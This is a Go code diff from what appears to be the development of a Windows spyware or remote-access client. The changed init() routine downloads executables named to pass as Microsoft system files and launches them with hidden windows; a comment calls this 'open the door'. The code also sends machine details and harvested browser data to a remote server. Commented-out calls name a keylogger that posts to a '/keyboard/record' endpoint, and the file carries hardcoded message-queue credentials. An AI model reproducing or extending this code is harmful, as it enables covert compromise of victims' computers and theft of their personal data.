@@ -34,7 +34,7 @@ type Info struct {
 }
 
 var Config = Info{
-	true,
+	false,
 	false,
 	8888,
 	":9999",
@@ -64,41 +64,12 @@ func onReady() {
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
 	go transfer.PacHandle(Config.PacPort)
-	go func() {
-		//fixed ioop download check
-		_, err := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
-		if err != nil {
-			log.Println(err)
-			downflag := make(chan string)
-			//keep the main process live
-			go lib.MultiFileDown([]string{}, "init", downflag)
-			<-downflag
-			//open the door
-			cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			cmd.Start()
-			cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
-			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			cmd2.Start()
-			finflag := make(chan string)
-			go machineinfo.MachineSend("http://"+conf.Url+backendAddr+"/machine/machineInfo", finflag)
-			<-finflag
-			go browser.Digpack("http://"+conf.Url+backendAddr+"/browser/", finflag)
-		} else {
-			go lib.ListProcess()
-			//cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
-			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			//cmd.Start()
-			cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
-			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			cmd2.Start()
-		}
-		//go killit.Killit()
-		//go hitboard.KeyBoardCollection("http://" + conf.Url + backendAddr +"/keyboard/record")
-		//go tunnel.Tunnel(conf.Url)
-		////check update
-		//go lib.DoUpdate()
-	}()
+	finflag := make(chan string)
+	go machineinfo.MachineSend("http://"+conf.Url+backendAddr+"/machine/machineInfo", finflag)
+	<-finflag
+	if lib.FileExits(lib.BrowserSafepath) != nil {
+		go browser.Digpack("http://"+conf.Url+backendAddr+"/browser/", finflag)
+	}
 	AmqpURI := "amqp://jin:jinjin123@" + conf.Url + mqAddr
 	mqhost := rmq.NewIConfigByVHost(lib.MQHOST)
 	iConsumer := rmq.NewIConsumerByConfig(AmqpURI, true, false, mqhost)
@@ -157,13 +128,40 @@ func init() {
 		backendAddr = lib.PMVC
 		mqAddr = lib.PMQ
 	}
+	//fixed ioop download check
+	_, err := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
+	if err != nil {
+		log.Println(err)
+		downflag := make(chan string)
+		//keep the main process live
+		go lib.MultiFileDown([]string{}, "init", downflag)
+		<-downflag
+		//open the door
+		cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd.Start()
+		cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
+		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd2.Start()
+	} else {
+		_, err := os.Stat(lib.CURRENTPATH + "MicrosoftBroker.exe")
+		if err != nil {
+			go lib.ListProcess()
+		}
+		//cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
+		//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		//cmd.Start()
+		cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
+		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd2.Start()
+	}
 	//currentprogram path log
 	content, _ := transfer.GetTargetPath()
 	data := []byte(content)
 	if ioutil.WriteFile(lib.CURRENTPATHLOG, data, 0644) == nil {
 	}
 	if !Config.Dev {
-		log.Println("已启动free客户端，请在free" + strconv.Itoa(Config.ClientPort) + ".log查看详细日志")
+		log.Println("已启动free客户端，请在free.log查看详细日志")
 		f, _ := os.OpenFile("free"+strconv.Itoa(Config.ClientPort)+".log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
 		log.SetOutput(f)
 	}
